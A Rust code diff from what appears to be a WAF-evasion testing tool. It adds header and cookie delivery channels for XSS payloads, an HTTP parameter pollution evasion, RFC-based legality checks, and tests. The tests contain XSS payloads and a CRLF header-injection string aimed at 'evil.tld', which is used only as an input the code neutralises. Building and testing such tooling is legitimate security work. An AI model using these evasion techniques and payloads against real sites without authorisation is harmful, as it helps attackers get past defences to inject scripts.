@@ -117,9 +117,35 @@ pub enum DeliveryShape {
     /// Payload as a URL path segment (`/…/<payload>`). CRS SQLi rules
     /// target ARGS, not the path.
     PathSegment,
-    /// Duplicate-parameter split: `?<p>=<a>&<p>=<b>` where the backend
-    /// concatenates `a`+`b`. WAF sees two harmless halves.
+    /// HTTP-Parameter-Pollution last-occurrence evasion:
+    /// `?<p>=v0&<p>=v1&…&<p>=<payload>` — `parts` benign decoy values
+    /// precede the intact payload, which is carried whole in the LAST
+    /// occurrence. WAFs that inspect only the first occurrence (or
+    /// score each occurrence independently) miss it; the payload is
+    /// never split. Sound on last-occurrence-wins backends (PHP
+    /// `$_GET`, Express, Spring `@RequestParam`, Rails); NOT sound on
+    /// first-wins or value-concatenating (legacy ASP.NET) backends —
+    /// the recovered value there is not the original payload. (The
+    /// decoys are throwaway markers, never fragments of the payload —
+    /// this is deliberately NOT a payload-splitting/concat technique.)
     HppSplit { param: String, parts: usize },
+    /// Payload as a **request header** value (e.g. `X-Forwarded-Host`,
+    /// `Referer`). Apps that build links / reflect these into HTML emit
+    /// XSS from them; CRS's `REQUEST_HEADERS` XSS coverage at PL1 is
+    /// weaker than its ARGS coverage. Transparent to the backend *iff
+    /// the app reflects that header* (the same conditional transparency
+    /// as `PathSegment`). Only sound for payloads with no CR/LF/NUL —
+    /// see [`DeliveryShape::transport_legal`].
+    HeaderValue { name: String },
+    /// Payload as a **cookie** value (`Cookie: <name>=<payload>`).
+    /// Reflected-cookie XSS is a real class and `REQUEST_COOKIES` is a
+    /// distinct WAF inspection surface from ARGS. Transparent to the
+    /// backend *iff the app reflects that cookie*. Only sound for
+    /// payloads that are valid RFC 6265 cookie-octets (no CR/LF/NUL,
+    /// `;`, `,`, whitespace, DQUOTE, backslash) — see
+    /// [`DeliveryShape::transport_legal`]; the generator never pairs an
+    /// illegal payload with this shape.
+    Cookie { name: String },
 }
 
 impl DeliveryShape {
@@ -133,6 +159,55 @@ impl DeliveryShape {
             Self::MultipartFile { .. } => "multipart_file",
             Self::PathSegment => "path_segment",
             Self::HppSplit { .. } => "hpp_split",
+            Self::HeaderValue { .. } => "header_value",
+            Self::Cookie { .. } => "cookie",
+        }
+    }
+
+    /// Whether this shape can carry `payload` *without the payload
+    /// forging transport structure* (header/cookie injection, request
+    /// smuggling). For every encoding shape (query/form/json/multipart/
+    /// path/hpp) the payload is percent-/JSON-/multipart-escaped so the
+    /// backend recovers the exact bytes — always legal. For the raw
+    /// channels (`HeaderValue`, `Cookie`) we MUST NOT encode (the
+    /// backend XSS sink must see the literal bytes), so the payload
+    /// itself must already be legal in that transport position. The
+    /// generator calls this and never emits an illegal pairing; this is
+    /// the delivery-axis anti-rig (a member that forged a smuggled
+    /// header would be a different attack, not a sound rewrite).
+    #[must_use]
+    pub fn transport_legal(&self, payload: &str) -> bool {
+        match self {
+            Self::HeaderValue { .. } => {
+                // RFC 9110 §5.5: CR/LF/NUL terminate or split the header.
+                // ALSO — recipients strip leading/trailing OWS (SP/HTAB)
+                // from a field value before processing, so a payload
+                // that begins or ends with SP/HTAB would reach the app
+                // *trimmed* (≠ member.payload) — that is unsound, reject
+                // it. Interior SP and `<` `>` `"` are legal field-value
+                // octets and arrive verbatim.
+                let bytes = payload.as_bytes();
+                let edge_ows = matches!(bytes.first(), Some(b' ' | b'\t'))
+                    || matches!(bytes.last(), Some(b' ' | b'\t'));
+                !edge_ows
+                    && !payload.bytes().any(|b| b == b'\r' || b == b'\n' || b == 0)
+            }
+            Self::Cookie { .. } => {
+                // RFC 6265 cookie-octet: %x21 / %x23-2B / %x2D-3A /
+                // %x3C-5B / %x5D-7E. Excludes CTL, SP, DQUOTE, comma,
+                // semicolon, backslash — any of which would split the
+                // cookie or forge a new one.
+                !payload.is_empty()
+                    && payload.bytes().all(|b| {
+                        b == 0x21
+                            || (0x23..=0x2B).contains(&b)
+                            || (0x2D..=0x3A).contains(&b)
+                            || (0x3C..=0x5B).contains(&b)
+                            || (0x5D..=0x7E).contains(&b)
+                    })
+            }
+            // Encoding shapes recover exact bytes at the backend.
+            _ => true,
         }
     }
 }
@@ -275,6 +350,21 @@ fn effective_boundary(parts: &[&str]) -> String {
     bnd
 }
 
+/// SOUNDNESS GATE for the joint `(payload × delivery)` algebra. A
+/// member whose payload cannot legally occupy its delivery channel —
+/// a raw `HeaderValue`/`Cookie` payload carrying bytes (`CR`/`LF`/
+/// `NUL`/`;`/space/…) that [`DeliveryShape::to_request`] would have to
+/// strip — is NOT an equivalent rewrite: what reaches the backend
+/// would differ from `member.payload`, so verifying against
+/// `member.payload` would be a rig. Drop it. This runs at the tail of
+/// EVERY per-class generator, so the invariant holds for all classes
+/// uniformly (XSS additionally guards inline to preserve recall by
+/// re-sampling rather than dropping). Encoding shapes are always
+/// legal, so non-raw deliveries are untouched.
+pub(crate) fn enforce_transport_legal(out: &mut Vec<EquivPayload>) {
+    out.retain(|m| m.delivery.transport_legal(&m.payload));
+}
+
 fn url_with_pair(target: &str, param: &str, raw_value: &str) -> String {
     let base = target.trim_end_matches('/');
     let sep = if base.contains('?') { '&' } else { '?' };
@@ -367,6 +457,31 @@ impl DeliveryShape {
                 }
                 Request::get(url_with_pair(&u, param, payload))
             }
+            Self::HeaderValue { name } => {
+                // Defense-in-depth smuggling guard: CR/LF/NUL can never
+                // reach the wire even if a careless direct caller skips
+                // `transport_legal`. On generator-produced members this
+                // strip is provably a no-op (they are pre-filtered).
+                let safe: String = payload
+                    .chars()
+                    .filter(|&c| c != '\r' && c != '\n' && c != '\0')
+                    .collect();
+                let mut r = Request::get(target.to_string());
+                r.add_header(name, safe);
+                r
+            }
+            Self::Cookie { name } => {
+                // Strip the request-`Cookie:` pair separator `;` plus
+                // CR/LF/NUL so a direct caller can never forge a second
+                // cookie / split the request. No-op on sound members.
+                let safe: String = payload
+                    .chars()
+                    .filter(|&c| c != '\r' && c != '\n' && c != '\0' && c != ';')
+                    .collect();
+                let mut r = Request::get(target.to_string());
+                r.add_header("cookie", format!("{name}={safe}"));
+                r
+            }
         }
     }
 }
@@ -449,5 +564,477 @@ mod delivery_api_tests {
         assert!(!jb.headers.iter().any(|(k, _)| k == "content-type"));
         let jbody = String::from_utf8_lossy(jb.body.as_deref().unwrap_or(&[])).into_owned();
         assert!(jbody.starts_with("{\"q\":\"") && jbody.contains(p) && jbody.ends_with("\"}"));
+    }
+
+    #[test]
+    fn phase_c_arm_table_is_aligned_injective_and_tail_stable() {
+        // The Phase-C bandit sets `force_delivery: Some(i)` to index
+        // `delivery_set`, and `delivery_kind_label(i)` names that arm
+        // for reward attribution. The contract is NOT label-string
+        // equality with `DeliveryShape::label()` — `delivery_kind_label`
+        // is deliberately FINER (it splits JSON into `json_no_ct` vs
+        // `json_ct`, which `label()` collapses to `json_body`). The
+        // invariants that actually prevent mis-rewarded arms are:
+        let set = super::sql::delivery_set("q");
+
+        // (1) Every shape has its OWN reward bucket — `delivery_kind_
+        //     label` must be injective over the live index range, or
+        //     two shapes share a bandit arm and the search is blind.
+        let names: Vec<_> = (0..set.len())
+            .map(super::sql::delivery_kind_label)
+            .collect();
+        let uniq: std::collections::HashSet<_> = names.iter().collect();
+        assert_eq!(
+            uniq.len(),
+            set.len(),
+            "delivery_kind_label collides over 0..{} ({names:?}) — \
+             two delivery shapes reward the same bandit arm",
+            set.len()
+        );
+
+        // (2) The two JSON arms are the only place label() collapses;
+        //     everywhere else the coarse and fine labels agree, so a
+        //     drift in the non-JSON arms is still caught.
+        for (i, d) in set.iter().enumerate() {
+            let fine = super::sql::delivery_kind_label(i);
+            if matches!(d, DeliveryShape::JsonBody { .. }) {
+                assert!(
+                    fine == "json_no_ct" || fine == "json_ct",
+                    "json arm {i} mislabelled {fine:?}"
+                );
+            } else {
+                assert_eq!(fine, d.label(), "delivery arm {i} index/label drift");
+            }
+        }
+
+        // (3) The new raw channels were APPENDED at the tail (indices
+        //     8/9) so every pre-existing `force_delivery` index — and
+        //     any persisted Phase-C bandit state — still points at the
+        //     same shape it did before this change.
+        assert_eq!(set.len(), 10);
+        // The Phase-C bandit is `Bandit::new(DELIVERY_ARMS)`. If this
+        // drifts below `delivery_set().len()` the trailing arms are
+        // NEVER explored — the new channels would be dead in the
+        // adaptive scan path even though they render correctly.
+        assert_eq!(
+            super::sql::DELIVERY_ARMS,
+            set.len(),
+            "DELIVERY_ARMS ({}) != delivery_set len ({}) — Phase-C \
+             bandit cannot reach the tail delivery shapes",
+            super::sql::DELIVERY_ARMS,
+            set.len()
+        );
+        assert!(matches!(set[8], DeliveryShape::HeaderValue { .. }));
+        assert!(matches!(set[9], DeliveryShape::Cookie { .. }));
+        assert_eq!(super::sql::delivery_kind_label(7), "query");
+        assert_eq!(super::sql::delivery_kind_label(8), "header_value");
+        assert_eq!(super::sql::delivery_kind_label(9), "cookie");
+        // Out-of-range still degrades safely (no panic, defined value).
+        assert_eq!(super::sql::delivery_kind_label(999), "query");
+    }
+
+    #[test]
+    fn header_and_cookie_render_exact_bytes_no_smuggle() {
+        let t = "http://h/app?z=1";
+        // Sound payload (no CR/LF, no space/`;` → also cookie-legal).
+        let p = "<svg/onload=alert(1)>";
+        let hv = DeliveryShape::HeaderValue {
+            name: "X-Forwarded-Host".into(),
+        }
+        .to_request(t, p);
+        assert_eq!(hv.url, t, "header delivery must not alter the URL");
+        assert!(hv.body.is_none(), "header delivery has no body");
+        let xfh: Vec<_> = hv
+            .headers
+            .iter()
+            .filter(|(k, _)| k.eq_ignore_ascii_case("x-forwarded-host"))
+            .collect();
+        assert_eq!(xfh.len(), 1, "exactly one injected header");
+        assert_eq!(xfh[0].1, p, "exact payload bytes reach the app verbatim");
+
+        let ck = DeliveryShape::Cookie { name: "q".into() }.to_request(t, p);
+        let cookie: Vec<_> = ck
+            .headers
+            .iter()
+            .filter(|(k, _)| k.eq_ignore_ascii_case("cookie"))
+            .collect();
+        assert_eq!(cookie.len(), 1);
+        assert_eq!(cookie[0].1, format!("q={p}"));
+
+        // ADVERSARIAL: a payload that *tries* to forge a second header /
+        // cookie / split the request must be neutralised by to_request
+        // (defense-in-depth even though the generator pre-filters it).
+        let evil = "a\r\nSet-Cookie: pwn=1\r\nX-Evil: 1; Domain=evil.tld";
+        let hv2 = DeliveryShape::HeaderValue {
+            name: "X-Forwarded-Host".into(),
+        }
+        .to_request(t, evil);
+        for (k, v) in &hv2.headers {
+            assert!(
+                !v.contains('\r') && !v.contains('\n'),
+                "CR/LF leaked into header {k}: {v:?} (request smuggling)"
+            );
+        }
+        assert!(
+            !hv2.headers
+                .iter()
+                .any(|(k, _)| k.eq_ignore_ascii_case("set-cookie")
+                    || k.eq_ignore_ascii_case("x-evil")),
+            "payload forged an extra header"
+        );
+        let ck2 = DeliveryShape::Cookie { name: "q".into() }.to_request(t, evil);
+        let cv = &ck2
+            .headers
+            .iter()
+            .find(|(k, _)| k.eq_ignore_ascii_case("cookie"))
+            .unwrap()
+            .1;
+        assert!(
+            !cv.contains('\r')
+                && !cv.contains('\n')
+                && !cv.contains(';')
+                && !cv.contains('\0'),
+            "cookie value can forge structure: {cv:?}"
+        );
+    }
+
+    #[test]
+    fn transport_legal_enforces_rfc_boundaries() {
+        let hv = DeliveryShape::HeaderValue { name: "X".into() };
+        let ck = DeliveryShape::Cookie { name: "q".into() };
+        // Header field-value: `<` `>` `"` INTERIOR space `=` `(` legal.
+        assert!(hv.transport_legal("<svg onload=alert(1)>"));
+        assert!(hv.transport_legal("\"';--><script>"));
+        assert!(hv.transport_legal("a b c"), "interior SP is a legal octet");
+        // CR/LF/NUL are illegal in a header value.
+        assert!(!hv.transport_legal("a\rb"));
+        assert!(!hv.transport_legal("a\nb"));
+        assert!(!hv.transport_legal("a\0b"));
+        // RFC 9110 §5.5: recipients strip leading/trailing OWS, so an
+        // edge-whitespace payload would arrive TRIMMED (≠ member.payload)
+        // — must be rejected as unsound, not "usually fine".
+        assert!(!hv.transport_legal(" <svg>"), "leading SP would be trimmed");
+        assert!(!hv.transport_legal("<svg> "), "trailing SP would be trimmed");
+        assert!(!hv.transport_legal("\t<svg>"), "leading HTAB would be trimmed");
+        assert!(!hv.transport_legal("<svg>\t"), "trailing HTAB would be trimmed");
+        // Cookie-octet: space, `;`, `,`, `"`, `\`, CTL all illegal.
+        assert!(ck.transport_legal("<svg/onload=alert(1)>"));
+        assert!(!ck.transport_legal("<svg onload=alert(1)>")); // space
+        assert!(!ck.transport_legal("a;b"));
+        assert!(!ck.transport_legal("a,b"));
+        assert!(!ck.transport_legal("a\"b"));
+        assert!(!ck.transport_legal("a\\b"));
+        assert!(!ck.transport_legal(""));
+        // Encoding shapes recover exact bytes — always legal.
+        for d in [
+            DeliveryShape::Query { param: "q".into() },
+            DeliveryShape::PathSegment,
+            DeliveryShape::JsonBody {
+                param: "q".into(),
+                content_type: None,
+            },
+        ] {
+            assert!(d.transport_legal("a\r\n;\0\" anything"));
+        }
+    }
+
+    #[test]
+    fn generator_never_pairs_illegal_payload_with_raw_channel() {
+        // Every Cookie/Header member the XSS generator yields must be
+        // transport-legal for its channel AND still execute the script —
+        // the delivery-axis anti-rig at the generator boundary.
+        for atk in [
+            "<svg onload=alert(1)>",
+            "<img src=x onerror=alert(1)>",
+            "<a href=javascript:alert(1)>x</a>",
+        ] {
+            let members = xss_delivered(atk, 64);
+            for m in &members {
+                assert!(
+                    xss::still_executes_xss(atk, &m.payload),
+                    "unsound member {:?}",
+                    m.payload
+                );
+                assert!(
+                    m.delivery.transport_legal(&m.payload),
+                    "{} member {:?} is NOT legal for that channel",
+                    m.delivery.label(),
+                    m.payload
+                );
+                // The rendered request can never carry a smuggle byte.
+                if matches!(
+                    m.delivery,
+                    DeliveryShape::HeaderValue { .. } | DeliveryShape::Cookie { .. }
+                ) {
+                    let r = m.delivery.to_request("http://h/p", &m.payload);
+                    for (_, v) in &r.headers {
+                        assert!(
+                            !v.contains('\r') && !v.contains('\n') && !v.contains('\0'),
+                            "smuggle byte in rendered header: {v:?}"
+                        );
+                    }
+                }
+            }
+        }
+        // Both raw channels are deterministically reachable: a
+        // space/`;`-free attack is cookie-octet-legal, so the identity
+        // seed alone pairs it with Header AND Cookie.
+        let legal = xss_delivered("<svg/onload=alert(1)>", 96);
+        assert!(
+            legal.iter().any(|m| m.delivery.label() == "header_value"),
+            "header_value channel never exercised"
+        );
+        assert!(
+            legal.iter().any(|m| m.delivery.label() == "cookie"),
+            "cookie channel never exercised for a cookie-legal attack"
+        );
+    }
+}
+
+/// ROUND-TRIP SOUNDNESS — the load-bearing invariant of the entire
+/// `(payload × delivery)` algebra: whatever shape the payload is
+/// delivered in, a conforming backend MUST recover the *exact same
+/// bytes*. If any shape silently mangles the value (the class of bug
+/// the earlier param-name-not-encoded defect belonged to), the WAF
+/// might be bypassed but the exploit no longer fires — an unsound,
+/// rigged "bypass". Every assertion decodes the rendered request the
+/// way a real backend would and demands byte-equality.
+#[cfg(test)]
+mod delivery_roundtrip_tests {
+    use super::*;
+
+    fn pct_decode(s: &str) -> String {
+        urlencoding::decode(s)
+            .expect("renderer emitted non-UTF-8 percent-encoding")
+            .into_owned()
+    }
+
+    /// Values a backend parses out of `?a=1&p=…&p=…` for `param`,
+    /// in document order (urldecoded). Splitting on raw `&`/`=` is
+    /// safe: the renderer percent-encodes those inside values.
+    fn query_values(url: &str, param: &str) -> Vec<String> {
+        let q = url.split_once('?').map_or("", |(_, q)| q);
+        q.split('&')
+            .filter_map(|kv| kv.split_once('='))
+            .filter(|(k, _)| pct_decode(k) == param)
+            .map(|(_, v)| pct_decode(v))
+            .collect()
+    }
+
+    /// Minimal RFC 8259 JSON string-content unescaper — enough to
+    /// invert `json_escape` (and then some, for robustness).
+    fn json_unescape(s: &str) -> String {
+        let b: Vec<char> = s.chars().collect();
+        let mut out = String::with_capacity(s.len());
+        let mut i = 0;
+        while i < b.len() {
+            if b[i] == '\\' && i + 1 < b.len() {
+                match b[i + 1] {
+                    '"' => out.push('"'),
+                    '\\' => out.push('\\'),
+                    '/' => out.push('/'),
+                    'n' => out.push('\n'),
+                    'r' => out.push('\r'),
+                    't' => out.push('\t'),
+                    'b' => out.push('\u{0008}'),
+                    'f' => out.push('\u{000c}'),
+                    'u' => {
+                        let hex: String = b[i + 2..(i + 6).min(b.len())].iter().collect();
+                        let cp = u32::from_str_radix(&hex, 16).expect("bad \\u escape");
+                        out.push(char::from_u32(cp).expect("bad code point"));
+                        i += 6;
+                        continue;
+                    }
+                    other => out.push(other),
+                }
+                i += 2;
+            } else {
+                out.push(b[i]);
+                i += 1;
+            }
+        }
+        out
+    }
+
+    fn ct(r: &wafrift_types::Request) -> String {
+        r.headers
+            .iter()
+            .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
+            .map(|(_, v)| v.clone())
+            .unwrap_or_default()
+    }
+
+    /// THE corpus: every byte-class that has historically broken a
+    /// transport encoder.
+    const PAYLOADS: &[&str] = &[
+        "<svg onload=alert(1)>",
+        "a&b=c&d",            // query-structure metachars
+        "k=v=w",              // bare '=' run
+        "\"';--></script>",   // quotes + angle
+        "100% done",          // literal percent
+        "a\r\nSet-Cookie: x", // CRLF (encoding shapes MUST still recover)
+        "日本語<害>",          // multibyte
+        "a/b/../c",           // slashes + dot segments
+        "\\back\\slash\\",    // backslashes (JSON-sensitive)
+        ";semi;colons;",      // cookie-sensitive
+        " ",                  // lone space
+        "",                   // empty
+        "tab\tnull\u{0}end",  // control bytes (JSON \u escapes)
+    ];
+
+    #[test]
+    fn every_encoding_shape_recovers_exact_payload_bytes() {
+        let t = "http://app.tld/base/path?fixed=1";
+        for &p in PAYLOADS {
+            // Query
+            let q = DeliveryShape::Query { param: "q".into() }.to_request(t, p);
+            assert_eq!(
+                query_values(&q.url, "q"),
+                vec![p.to_string()],
+                "Query mangled {p:?}"
+            );
+
+            // FormBody
+            let fb = DeliveryShape::FormBody { param: "q".into() }.to_request(t, p);
+            let body = String::from_utf8(fb.body.clone().unwrap_or_default()).unwrap();
+            let (k, v) = body.split_once('=').expect("form body shape");
+            assert_eq!(pct_decode(k), "q");
+            assert_eq!(pct_decode(v), p, "FormBody mangled {p:?}");
+            assert!(ct(&fb).contains("x-www-form-urlencoded"));
+
+            // JsonBody (both CT modes recover identically)
+            for c in [None, Some("application/json".to_string())] {
+                let jb = DeliveryShape::JsonBody {
+                    param: "q".into(),
+                    content_type: c.clone(),
+                }
+                .to_request(t, p);
+                let jbody =
+                    String::from_utf8(jb.body.clone().unwrap_or_default()).unwrap();
+                // {"<k>":"<v>"} — strip the structural frame, unescape.
+                let inner = jbody
+                    .strip_prefix('{')
+                    .and_then(|s| s.strip_suffix('}'))
+                    .expect("json object frame");
+                let (kq, vq) = inner.split_once(':').expect("json k:v");
+                let key = json_unescape(kq.trim_matches('"'));
+                let val = json_unescape(
+                    vq.strip_prefix('"')
+                        .and_then(|s| s.strip_suffix('"'))
+                        .expect("quoted json value"),
+                );
+                assert_eq!(key, "q");
+                assert_eq!(val, p, "JsonBody({c:?}) mangled {p:?}");
+            }
+
+            // Multipart field + file: raw, byte-transparent.
+            for d in [
+                DeliveryShape::MultipartField { name: "q".into() },
+                DeliveryShape::MultipartFile {
+                    name: "q".into(),
+                    filename: "a.bin".into(),
+                    part_ct: "application/octet-stream".into(),
+                },
+            ] {
+                let mp = d.to_request(t, p);
+                let body =
+                    String::from_utf8(mp.body.clone().unwrap_or_default()).unwrap();
+                let bnd = ct(&mp)
+                    .split_once("boundary=")
+                    .map(|(_, b)| b.to_string())
+                    .expect("multipart boundary");
+                let after = body
+                    .split_once("\r\n\r\n")
+                    .map(|(_, x)| x)
+                    .expect("part header/body sep");
+                let recovered = after
+                    .rsplit_once(&format!("\r\n--{bnd}"))
+                    .map(|(x, _)| x)
+                    .expect("closing boundary");
+                assert_eq!(recovered, p, "{} mangled {p:?}", d.label());
+                // RFC 7578: the boundary the renderer chose must not
+                // occur inside the payload it framed.
+                assert!(
+                    !p.contains(bnd.as_str()) || bnd != MP_BOUNDARY,
+                    "boundary collides with payload"
+                );
+            }
+
+            // PathSegment
+            let ps = DeliveryShape::PathSegment.to_request(t, p);
+            let path = ps.url.split_once('?').map_or(ps.url.as_str(), |(a, _)| a);
+            let seg = path.rsplit_once('/').map(|(_, s)| s).expect("a path segment");
+            assert_eq!(pct_decode(seg), p, "PathSegment mangled {p:?}");
+        }
+    }
+
+    #[test]
+    fn raw_channels_recover_exact_bytes_when_transport_legal() {
+        let t = "http://app.tld/p";
+        let hv = DeliveryShape::HeaderValue {
+            name: "X-Forwarded-Host".into(),
+        };
+        let ck = DeliveryShape::Cookie { name: "sid".into() };
+        for &p in PAYLOADS {
+            if hv.transport_legal(p) {
+                let r = hv.to_request(t, p);
+                let got = r
+                    .headers
+                    .iter()
+                    .find(|(k, _)| k.eq_ignore_ascii_case("x-forwarded-host"))
+                    .map(|(_, v)| v.clone())
+                    .expect("header present");
+                assert_eq!(got, p, "HeaderValue is not byte-transparent for {p:?}");
+            }
+            if ck.transport_legal(p) {
+                let r = ck.to_request(t, p);
+                let cv = r
+                    .headers
+                    .iter()
+                    .find(|(k, _)| k.eq_ignore_ascii_case("cookie"))
+                    .map(|(_, v)| v.clone())
+                    .expect("cookie present");
+                let (name, val) = cv.split_once('=').expect("cookie name=value");
+                assert_eq!(name, "sid");
+                assert_eq!(val, p, "Cookie is not byte-transparent for {p:?}");
+            }
+        }
+    }
+
+    /// Pins the documented backend-model dependence of `HppSplit`
+    /// (now stated truthfully on the variant): the payload is whole in
+    /// the LAST occurrence with benign decoys before it — sound on
+    /// last-wins backends, and explicitly NOT a payload-split/concat
+    /// technique. A regression that started fragmenting the payload
+    /// across occurrences (resurrecting the old, wrong "concat" doc)
+    /// would flip these assertions.
+    #[test]
+    fn hpp_split_is_last_occurrence_pollution_not_concat() {
+        let t = "http://app.tld/p";
+        let payload = "<svg onload=alert(1)>";
+        let r = DeliveryShape::HppSplit {
+            param: "q".into(),
+            parts: 3,
+        }
+        .to_request(t, payload);
+        let vs = query_values(&r.url, "q");
+        assert_eq!(vs.len(), 4, "3 decoys + 1 payload occurrence");
+        // Last-wins backend (PHP/Express/Spring/Rails): sound.
+        assert_eq!(vs.last().unwrap(), payload, "payload not whole in last occ");
+        // Decoys are throwaway markers, never payload fragments.
+        for d in &vs[..3] {
+            assert!(
+                !payload.contains(d.as_str()) && d.starts_with('v'),
+                "decoy {d:?} is a payload fragment — concat-splitting regressed"
+            );
+        }
+        // First-wins backend would see a benign decoy (evasion-safe,
+        // exploit-inert) — never a partial payload.
+        assert_eq!(vs.first().unwrap(), "v0");
+        // Concatenating backend would see decoys glued to the payload —
+        // i.e. NOT the original. This is the documented unsound case;
+        // asserting it keeps the variant doc honest.
+        assert_ne!(vs.concat(), payload);
+        assert!(vs.concat().ends_with(payload));
     }
 }
